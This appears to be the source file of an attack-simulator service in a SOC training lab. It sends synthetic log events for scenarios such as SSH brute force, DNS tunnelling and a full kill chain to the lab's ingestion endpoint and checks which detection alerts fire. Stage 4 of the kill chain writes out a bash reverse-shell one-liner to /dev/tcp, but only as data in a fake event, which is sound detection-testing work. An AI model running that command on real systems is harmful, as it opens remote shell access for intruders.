"""
services/attacker/main.py — Attack Simulator UI

Runs on port 8090. Completely separate from the SOC dashboard.
Provides a browser-based interface for launching attack scenarios
against the SOC Lab ingestion endpoint and watching detection feedback.

Routes:
  GET  /                     — attacker UI
  POST /api/launch           — launch a scenario (streams SSE progress)
  GET  /api/stream/{run_id}  — SSE stream for a running scenario
  GET  /api/recent-alerts    — alerts fired in last N seconds (detection feedback)
  GET  /api/status           — ingestion health + scenario list
"""
from __future__ import annotations
import os, sys, json, logging, threading, uuid, time, queue
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any

sys.path.insert(0, "/app")

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware

logging.basicConfig(level=os.environ.get("LOG_LEVEL", "INFO"),
                    format="%(asctime)s [attacker] %(levelname)s %(message)s")
log = logging.getLogger(__name__)

INGESTION_URL = os.environ.get("INGESTION_URL", "http://ingestion:8001")
SOC_DB_PATH   = os.environ.get("DB_PATH", "/app/db/soc.db")

BASE      = Path(__file__).parent
templates = Jinja2Templates(directory=str(BASE / "templates"))

app = FastAPI(title="SOC Lab – Attack Simulator")
app.add_middleware(CORSMiddleware, allow_origins=["*"],
                   allow_methods=["*"], allow_headers=["*"])

# ── Scenario registry ─────────────────────────────────────────────────────────

SCENARIO_META = {
    "brute_force": {
        "name":        "SSH Brute Force",
        "description": "Fire multiple failed login attempts from one external IP. "
                       "Classic password-guessing attack against SSH.",
        "technique":   "T1110.001",
        "tactic":      "Credential Access",
        "severity":    "high",
        "icon":        "🔨",
        "expected_rules": ["BF001 — SSH Brute Force"],
        "event_count": "8 events",
        "color":       "red",
    },
    "cred_stuff": {
        "name":        "Credential Stuffing",
        "description": "Multiple failures from one IP, then a successful login. "
                       "Simulates using a breached credential list.",
        "technique":   "T1110.004",
        "tactic":      "Credential Access",
        "severity":    "high",
        "icon":        "🔑",
        "expected_rules": ["BF002 — Credential Stuffing", "BF003 — Rapid Login Failures"],
        "event_count": "6 events",
        "color":       "red",
    },
    "powershell": {
        "name":        "Suspicious PowerShell",
        "description": "Launch a process with a malicious command line — encoded "
                       "commands, download cradles, or reverse shell one-liners.",
        "technique":   "T1059.001",
        "tactic":      "Execution",
        "severity":    "high",
        "icon":        "💻",
        "expected_rules": ["PROC001 — Suspicious PowerShell", "PROC002 — Temp Directory"],
        "event_count": "1–2 events",
        "color":       "orange",
    },
    "new_user": {
        "name":        "Backdoor Account Creation",
        "description": "Create a hidden local user account. Common persistence "
                       "technique after initial compromise.",
        "technique":   "T1136.001",
        "tactic":      "Persistence",
        "severity":    "high",
        "icon":        "👤",
        "expected_rules": ["USR001 — New User Account Created"],
        "event_count": "1 event",
        "color":       "orange",
    },
    "dns_tunnel": {
        "name":        "DNS Tunneling / C2",
        "description": "High-frequency DNS queries to suspicious domains. "
                       "Simulates DNS-based C2 channel or data exfiltration.",
        "technique":   "T1048.001",
        "tactic":      "Exfiltration",
        "severity":    "high",
        "icon":        "📡",
        "expected_rules": ["DNS001 — Suspicious TLD", "DNS002 — High-Freq DNS"],
        "event_count": "26 events",
        "color":       "purple",
    },
    "impossible_travel": {
        "name":        "Impossible Travel",
        "description": "Same user account logs in from two geographically distant "
                       "locations within seconds. Indicates compromised credentials.",
        "technique":   "T1078.004",
        "tactic":      "Defense Evasion",
        "severity":    "high",
        "icon":        "✈️",
        "expected_rules": ["TRAVEL001 — Impossible Travel"],
        "event_count": "2 events",
        "color":       "blue",
    },
    "web_scan": {
        "name":        "Web Application Scan",
        "description": "Automated directory enumeration — hitting common admin "
                       "paths, config files, and backup locations.",
        "technique":   "T1595.003",
        "tactic":      "Reconnaissance",
        "severity":    "low",
        "icon":        "🕷",
        "expected_rules": ["WEB001 — Auth Probing", "WEB002 — Path Scanning"],
        "event_count": "20 events",
        "color":       "yellow",
    },
    "full_chain": {
        "name":        "Full Kill Chain",
        "description": "Complete multi-stage attack: recon → credential access → "
                       "execution → persistence → C2. Tests the whole pipeline.",
        "technique":   "Multiple",
        "tactic":      "Full Kill Chain",
        "severity":    "critical",
        "icon":        "☠️",
        "expected_rules": ["BF001", "BF002", "PROC001", "USR001", "DNS001"],
        "event_count": "60+ events",
        "color":       "red",
        "is_chain":    True,
    },
}

# ── In-memory run tracking ────────────────────────────────────────────────────
# run_id → Queue of SSE messages
_runs: dict[str, queue.Queue] = {}
_runs_lock = threading.Lock()


def _new_run() -> str:
    run_id = str(uuid.uuid4())[:8]
    with _runs_lock:
        _runs[run_id] = queue.Queue()
    return run_id


def _push(run_id: str, event_type: str, data: dict) -> None:
    with _runs_lock:
        q = _runs.get(run_id)
    if q:
        q.put({"type": event_type, "data": data})


def _close_run(run_id: str) -> None:
    with _runs_lock:
        q = _runs.get(run_id)
    if q:
        q.put(None)   # sentinel


# ── Patched send function (streams progress) ──────────────────────────────────

def _make_sender(run_id: str, timing: str):
    """
    Returns a _send() replacement that:
    - Adds a delay based on timing profile
    - Pushes SSE progress messages
    """
    import requests as _req

    delays = {"instant": 0.05, "normal": 0.3, "stealthy": 2.0}
    delay  = delays.get(timing, 0.3)

    def send(source: str, payload: dict) -> bool:
        try:
            r = _req.post(
                f"{INGESTION_URL}/ingest",
                json={"source": source, "payload": payload},
                timeout=5,
            )
            ok = r.status_code == 200
            result = r.json() if ok else {}
            _push(run_id, "event", {
                "ok":         ok,
                "event_type": payload.get("event_type", "?"),
                "host":       payload.get("host", "?"),
                "user":       payload.get("user"),
                "src_ip":     payload.get("src_ip"),
                "event_id":   result.get("event_id", "")[:8] if ok else "",
                "ts":         datetime.now(timezone.utc).strftime("%H:%M:%S"),
            })
            time.sleep(delay)
            return ok
        except Exception as exc:
            _push(run_id, "error", {"message": str(exc)})
            return False

    return send


# ── Scenario runners ──────────────────────────────────────────────────────────

def _run_scenario(scenario: str, target_host: str,
                  timing: str, run_id: str) -> None:
    """Run in a background thread. Patches the global sender."""
    import tools.generate_events as gen
    import random

    # Patch the send function and HOSTS for the duration of this run
    original_send  = gen._send
    original_hosts = gen.HOSTS[:]

    if target_host and target_host != "random":
        gen.HOSTS = [target_host]

    gen._send = _make_sender(run_id, timing)

    try:
        _push(run_id, "start", {"scenario": scenario, "timing": timing,
                                 "target": target_host or "random"})

        if scenario == "full_chain":
            _run_full_chain(gen, run_id, timing)
        else:
            fn = gen.ALL_SCENARIOS.get(scenario)
            if fn:
                fn()
            else:
                _push(run_id, "error", {"message": f"Unknown scenario: {scenario}"})

        _push(run_id, "done", {"scenario": scenario})

    except Exception as exc:
        log.error("Scenario %s failed: %s", scenario, exc, exc_info=True)
        _push(run_id, "error", {"message": str(exc)})
    finally:
        gen._send  = original_send
        gen.HOSTS  = original_hosts
        _close_run(run_id)


def _run_full_chain(gen, run_id: str, timing: str) -> None:
    """
    Full kill-chain scenario in stages, with progress announcements between each.
    Uses the same attacker IP and target host throughout.
    """
    import random

    attacker_ip  = random.choice(gen.IPS_EXT)
    target_host  = random.choice(gen.HOSTS)
    target_user  = random.choice(gen.USERS)
    backdoor_usr = random.choice(["support99", "svc_hidden", "admin2"])
    c2_domain    = random.choice(gen.SUSP_DOMAINS)

    def stage(name: str):
        _push(run_id, "stage", {"name": name})
        time.sleep(0.5)

    delays = {"instant": 0.05, "normal": 0.25, "stealthy": 1.5}
    d = delays.get(timing, 0.25)

    # Stage 1: Reconnaissance
    stage("1 / 6 — Reconnaissance: Web Scanning")
    paths = ["/admin", "/.env", "/wp-admin", "/.git/config", "/backup.zip"]
    for path in paths:
        gen._send("sim-endpoint", {
            "event_type": "web_404", "host": target_host, "src_ip": attacker_ip,
            "path": path, "status_code": 404, "method": "GET",
        })
        time.sleep(d)

    # Stage 2: Credential Access — Brute Force
    stage("2 / 6 — Credential Access: SSH Brute Force")
    for _ in range(6):
        gen._send("sim-endpoint", {
            "event_type": "auth_fail", "host": target_host,
            "user": target_user, "src_ip": attacker_ip,
        })
        time.sleep(d)

    # Stage 3: Initial Access — Successful Login
    stage("3 / 6 — Initial Access: Credential Stuffing Success")
    gen._send("sim-endpoint", {
        "event_type": "auth_success", "host": target_host,
        "user": target_user, "src_ip": attacker_ip,
    })
    time.sleep(d * 2)

    # Stage 4: Execution — Reverse Shell
    stage("4 / 6 — Execution: Reverse Shell")
    cmd = f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1"
    gen._send("sim-endpoint", {
        "event_type": "process_start", "host": target_host, "user": target_user,
        "process_name": "bash", "command_line": cmd, "file_path": "/tmp/shell.sh",
    })
    time.sleep(d)

    # Stage 5: Persistence — Backdoor User
    stage("5 / 6 — Persistence: Backdoor Account Creation")
    gen._send("sim-endpoint", {
        "event_type": "user_created", "host": target_host,
        "user": target_user, "new_user": backdoor_usr,
    })
    time.sleep(d)

    # Stage 6: C2 / Exfiltration — DNS Tunnel
    stage("6 / 6 — Command & Control: DNS Tunneling")
    for i in range(15):
        gen._send("sim-endpoint", {
            "event_type": "dns_query", "host": target_host,
            "dns_query": f"cmd{i:04x}.{c2_domain}",
        })
        time.sleep(d * 0.5)
    gen._send("sim-endpoint", {
        "event_type": "dns_suspicious", "host": target_host,
        "dns_query": f"stage2.{c2_domain}", "suspicious_tld": "true",
    })


# ── API routes ────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {
        "request":   request,
        "scenarios": SCENARIO_META,
        "soc_url":   os.environ.get("SOC_URL", "http://localhost:8080"),
    })


@app.post("/api/launch")
async def launch(request: Request):
    body     = await request.json()
    scenario = body.get("scenario", "brute_force")
    host     = body.get("target_host", "random")
    timing   = body.get("timing", "normal")

    if scenario not in SCENARIO_META:
        return JSONResponse({"ok": False, "error": "Unknown scenario"}, status_code=400)

    run_id = _new_run()
    t = threading.Thread(
        target=_run_scenario,
        args=(scenario, host, timing, run_id),
        daemon=True,
        name=f"scenario-{run_id}",
    )
    t.start()
    return JSONResponse({"ok": True, "run_id": run_id})


@app.get("/api/stream/{run_id}")
async def stream(run_id: str):
    """Server-Sent Events stream for a running scenario."""
    with _runs_lock:
        q = _runs.get(run_id)
    if not q:
        return JSONResponse({"error": "unknown run_id"}, status_code=404)

    def generate():
        while True:
            try:
                msg = q.get(timeout=30)
            except queue.Empty:
                yield "event: ping\ndata: {}\n\n"
                continue

            if msg is None:   # sentinel — done
                yield "event: close\ndata: {}\n\n"
                break

            yield f"event: {msg['type']}\ndata: {json.dumps(msg['data'])}\n\n"

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={
            "Cache-Control":               "no-cache",
            "X-Accel-Buffering":           "no",
            "Access-Control-Allow-Origin": "*",
        },
    )


@app.get("/api/recent-alerts")
async def recent_alerts(seconds: int = 90):
    """
    Return alerts created in the last N seconds.
    Used by the UI to show whether the launched scenario was detected.
    """
    try:
        import sqlite3
        con = sqlite3.connect(SOC_DB_PATH)
        con.row_factory = sqlite3.Row
        since = (datetime.utcnow() - timedelta(seconds=seconds)).isoformat() + "Z"
        rows  = con.execute(
            "SELECT alert_id, rule_name, severity, host, status, created_at, "
            "attack_tactic, attack_technique_id, hit_count "
            "FROM alerts WHERE created_at >= ? ORDER BY created_at DESC",
            (since,)
        ).fetchall()
        con.close()
        return {"alerts": [dict(r) for r in rows]}
    except Exception as exc:
        log.warning("recent_alerts DB read failed: %s", exc)
        return {"alerts": []}


@app.get("/api/status")
async def status():
    """Check ingestion reachability and return scenario list."""
    import urllib.request
    try:
        with urllib.request.urlopen(f"{INGESTION_URL}/health", timeout=3) as r:
            health = json.loads(r.read())
        ingestion_ok = True
    except Exception:
        health = {}
        ingestion_ok = False

    return {
        "ingestion_ok": ingestion_ok,
        "ingestion_url": INGESTION_URL,
        "scenarios": list(SCENARIO_META.keys()),
        "health": health,
    }


if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8090, reload=False)
